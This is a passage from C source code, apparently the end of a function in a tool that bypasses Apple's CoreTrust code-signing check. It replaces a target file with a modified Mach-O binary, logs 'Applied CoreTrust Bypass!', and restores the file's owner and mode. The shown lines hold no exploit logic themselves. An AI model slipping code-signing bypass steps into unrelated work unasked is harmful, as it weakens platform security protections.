    if (copyfile(machoPath, path, 0, COPYFILE_ALL | COPYFILE_MOVE | COPYFILE_UNLINK) != 0) {
        perror("copyfile");
        return -1;
    }

    free(machoPath);

    LOG("Applied CoreTrust Bypass!\n");
    chown(path, st.st_uid, st.st_gid);
    chmod(path, st.st_mode);
	return 0;
}


} // extern "C"
